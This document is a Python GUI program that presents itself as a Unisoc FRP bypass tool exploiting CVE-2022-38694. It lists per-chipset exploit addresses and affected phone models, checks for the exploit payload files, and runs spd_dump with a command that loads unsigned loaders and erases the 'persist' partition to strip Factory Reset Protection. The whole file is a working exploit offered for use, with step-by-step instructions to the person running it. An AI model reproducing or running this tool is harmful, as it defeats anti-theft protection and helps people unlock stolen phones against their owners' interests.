"""
unisoc FRP bypass tool - GUI
CVE-2022-38694 exploit
"""

import os
import sys
import subprocess
import threading
import tkinter as tk
from tkinter import ttk, filedialog
from pathlib import Path

CHIPSETS = {
    "UMS9230 (T606)": {
        "exec_addr": "0x65015f08",
        "fdl1_addr": "0x65000800",
        "fdl2_addr": "0x9efffe00",
        "fdl1_name": "fdl1-dl.bin",
        "fdl2_name": "fdl2-dl.bin",
        "devices": "realme C31/C33/C35, moto E13/G04, tecno spark 8C, itel S23"
    },
    "UMS512 (T610)": {
        "exec_addr": "0x3EE8",
        "fdl1_addr": "0x28007000",
        "fdl2_addr": "0x9efffe00",
        "fdl1_name": "fdl1.bin",
        "fdl2_name": "fdl2.bin",
        "devices": "realme C21y/C25y, moto G20"
    },
    "SC9863A": {
        "exec_addr": "0x4EE8",
        "fdl1_addr": "0x28007000",
        "fdl2_addr": "0x9efffe00",
        "fdl1_name": "fdl1.bin",
        "fdl2_name": "fdl2.bin",
        "devices": "ZTE blade, nokia C3, itel vision 3"
    },
    "UMS9620 (T618)": {
        "exec_addr": "0x65012F48",
        "fdl1_addr": "0x65000800",
        "fdl2_addr": "0x9efffe00",
        "fdl1_name": "fdl1.bin",
        "fdl2_name": "fdl2.bin",
        "devices": "retroid pocket, anbernic"
    },
    "UMS312 (T310)": {
        "exec_addr": "0x3EE8",
        "fdl1_addr": "0x28007000",
        "fdl2_addr": "0x9efffe00",
        "fdl1_name": "fdl1.bin",
        "fdl2_name": "fdl2.bin",
        "devices": "qin F21 pro"
    }
}

class Tool:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("unisoc FRP bypass")
        self.root.geometry("550x650")
        self.root.resizable(False, False)
        self.base_dir = Path(__file__).parent
        self.tools_dir = self.base_dir / "tools"
        self.exploit_dir = self.base_dir / "exploit"
        self.setup_ui()

    def setup_ui(self):
        tk.Label(self.root, text="unisoc FRP bypass", font=("Consolas", 18, "bold"),
                 fg="#00ff88", bg="#1a1a2e", pady=15).pack(fill="x")

        f = tk.Frame(self.root, padx=20, pady=10)
        f.pack(fill="both", expand=True)

        tk.Label(f, text="1. pick your chip:", font=("Arial", 11, "bold")).pack(anchor="w")
        self.chip_var = tk.StringVar(value=list(CHIPSETS.keys())[0])
        c = ttk.Combobox(f, textvariable=self.chip_var, values=list(CHIPSETS.keys()), state="readonly", width=35)
        c.pack(fill="x", pady=(0, 5))
        c.bind("<<ComboboxSelected>>", self.update_info)

        self.info_label = tk.Label(f, text="", font=("Arial", 9), fg="#666")
        self.info_label.pack(anchor="w", pady=(0, 10))
        self.update_info()

        tk.Label(f, text="2. check files:", font=("Arial", 11, "bold")).pack(anchor="w")
        self.file_frame = tk.Frame(f)
        self.file_frame.pack(fill="x", pady=(0, 10))
        self.labels = {}
        for name in ["fdl1", "fdl2", "exploit"]:
            self.labels[name] = tk.Label(self.file_frame, text=f"  {name}: ...", font=("Consolas", 9))
            self.labels[name].pack(anchor="w")
        self.check_files()

        tk.Label(f, text="3. instructions:", font=("Arial", 11, "bold")).pack(anchor="w")
        inst = tk.Text(f, height=7, font=("Arial", 9), bg="#f0f0f0", relief="flat", padx=10, pady=5)
        inst.pack(fill="x", pady=(0, 10))
        inst.insert("1.0",
            "step 1: connect phone via USB\n"
            "step 2: install SPD driver (run install_driver.bat)\n"
            "step 3: click Remove FRP below\n"
            "step 4: when prompted turn OFF your phone\n"
            "step 5: hold Vol+ and Vol- at same time\n"
            "step 6: while holding plug in USB cable\n"
            "step 7: keep holding until you see output")
        inst.config(state="disabled")

        tk.Label(f, text="output:", font=("Arial", 11, "bold")).pack(anchor="w")
        self.log = tk.Text(f, height=5, font=("Consolas", 9), bg="#1a1a2e", fg="#00ff88", relief="flat")
        self.log.pack(fill="x", pady=(0, 10))

        self.btn = tk.Button(f, text="Remove FRP", command=self.run_frp,
                            bg="#00aa55", fg="white", font=("Arial", 13, "bold"), height=2)
        self.btn.pack(fill="x")

        self.status = tk.StringVar(value="ready")
        tk.Label(self.root, textvariable=self.status, relief="sunken", anchor="w", padx=10).pack(fill="x", side="bottom")

    def update_info(self, e=None):
        chip = CHIPSETS[self.chip_var.get()]
        self.info_label.config(text=f"works on: {chip['devices']}")
        self.check_files()

    def check_files(self):
        chip_key = self.chip_var.get().split(" ")[0].lower()
        chip = CHIPSETS[self.chip_var.get()]
        path = self.exploit_dir / chip_key
        for name, fname in [("fdl1", chip["fdl1_name"]), ("fdl2", chip["fdl2_name"]), ("exploit", f"custom_exec_no_verify_{chip['exec_addr'][2:]}.bin")]:
            p = path / fname
            if p.exists():
                self.labels[name].config(text=f"  {name}: OK ({fname})", fg="#00aa00")
            else:
                self.labels[name].config(text=f"  {name}: MISSING ({fname})", fg="#cc0000")

    def append_log(self, msg):
        self.log.config(state="normal")
        self.log.insert("end", msg + "\n")
        self.log.see("end")
        self.log.config(state="disabled")
        self.root.update_idletasks()

    def clear_log(self):
        self.log.config(state="normal")
        self.log.delete("1.0", "end")
        self.log.config(state="disabled")

    def run_frp(self):
        self.clear_log()
        self.btn.config(state="disabled")
        self.status.set("running...")
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        chip = CHIPSETS[self.chip_var.get()]
        chip_key = self.chip_var.get().split(" ")[0].lower()
        spd = self.tools_dir / "spd_dump.exe"
        exp = self.exploit_dir / chip_key
        fdl1 = exp / chip["fdl1_name"]
        fdl2 = exp / chip["fdl2_name"]

        if not spd.exists():
            self.append_log("ERROR: spd_dump.exe not found in tools/")
            self.btn.config(state="normal")
            self.status.set("error")
            return

        if not fdl1.exists() or not fdl2.exists():
            self.append_log("ERROR: FDL files missing")
            self.append_log(f"need {chip['fdl1_name']} and {chip['fdl2_name']}")
            self.append_log(f"put them in exploit/{chip_key}/")
            self.btn.config(state="normal")
            self.status.set("error")
            return

        cmd = [str(spd), "--wait", "300", "--kick", "exec_addr", chip["exec_addr"],
               "fdl", str(fdl1), chip["fdl1_addr"], "fdl", str(fdl2), chip["fdl2_addr"],
               "exec", "erase_part", "persist", "reset"]

        self.append_log("plug in your phone now")
        self.append_log("hold Vol+ and Vol- while plugging in USB")
        self.append_log("")

        try:
            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, cwd=str(self.tools_dir))
            for line in p.stdout:
                if line.strip():
                    self.append_log(line.strip())
            p.wait()

            if p.returncode == 0:
                self.append_log("")
                self.append_log("DONE! FRP is gone")
                self.status.set("success!")
            else:
                self.append_log("")
                self.append_log("failed - try again")
                self.status.set("failed")
        except Exception as e:
            self.append_log(f"ERROR: {e}")
            self.status.set("error")
        finally:
            self.btn.config(state="normal")

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    Tool().run()
